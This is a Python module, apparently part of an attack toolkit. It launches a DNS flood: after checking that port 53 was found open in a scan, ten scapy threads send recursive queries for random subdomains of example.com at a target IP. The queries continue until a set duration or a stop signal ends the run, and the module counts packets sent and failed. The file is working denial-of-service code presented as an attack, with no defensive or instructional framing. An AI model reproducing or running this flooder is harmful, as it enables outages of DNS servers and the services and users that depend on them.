import random
import string
import time
from threading import Thread, Lock
from scapy.all import IP, UDP, DNS, DNSQR, send

def launch(target_ip, port_list, duration, tag, stop_event, fail_tracker):
    # Only proceed if port 53 is in the scanned port list
    if 53 not in port_list:
        print(f"[!] DNS flood '{tag}' aborted: Port 53 was not found open during scan.")
        return {
            "status": "skipped",
            "message": "Port 53 not found open. DNS flood not launched."
        }

    port_list = [53]  # Only target port 53
    threads = []
    stats_lock = Lock()
    stats = {'sent': 0, 'fail': 0}

    def random_subdomain(length=8):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def worker():
        while not stop_event.is_set():
            domain = random_subdomain() + '.example.com'
            pkt = IP(dst=target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
            try:
                send(pkt, verbose=0)
                with stats_lock:
                    stats['sent'] += 1
            except Exception:
                with stats_lock:
                    stats['fail'] += 1
                    if stats['fail'] > 20:
                        print(f"[x] DNS flood '{tag}' stopped due to excessive failures.")
                        stop_event.set()
                        break
            time.sleep(0.001)

    print(f"[+] Starting DNS flood attack '{tag}' on port 53")

    for _ in range(10):
        t = Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)

    start_time = time.time()
    while (duration == 0 or time.time() - start_time < duration) and not stop_event.is_set():
        time.sleep(1)

    stop_event.set()
    for t in threads:
        t.join()

    print(f"[✓] DNS flood '{tag}' ended. Packets sent: {stats['sent']}, Failures: {stats['fail']}")

    if stats['fail'] > 10:
        fail_tracker.append(f"{tag}-dnsflood")

    if isinstance(fail_tracker, dict):
        with stats_lock:
            fail_tracker['sent'] = fail_tracker.get('sent', 0) + stats['sent']
            fail_tracker['fail'] = fail_tracker.get('fail', 0) + stats['fail']

    return {"status": "completed"}
